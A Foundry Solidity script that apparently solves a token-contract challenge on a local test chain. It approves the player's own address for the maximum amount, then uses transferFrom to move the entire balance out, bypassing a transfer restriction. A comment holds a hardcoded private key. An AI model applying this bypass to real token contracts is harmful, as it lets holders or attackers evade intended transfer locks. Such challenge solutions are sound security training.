// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function transfer(address _to, uint256 _value) external returns (bool);
    function transferFrom(address,address,uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function player() external view returns (address);
}
contract SolveScript is Script {
    address public target = 0x1F708C24a0D3A740cD47cC0444E9480899f3dA7D;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        console.log("player address : %s", ITarget(target).player());
        ITarget(target).approve(ITarget(target).player(), type(uint256).max);
        ITarget(target).transferFrom(ITarget(target).player(), address(1), ITarget(target).balanceOf(ITarget(target).player()));
        vm.stopBroadcast();
    }
}
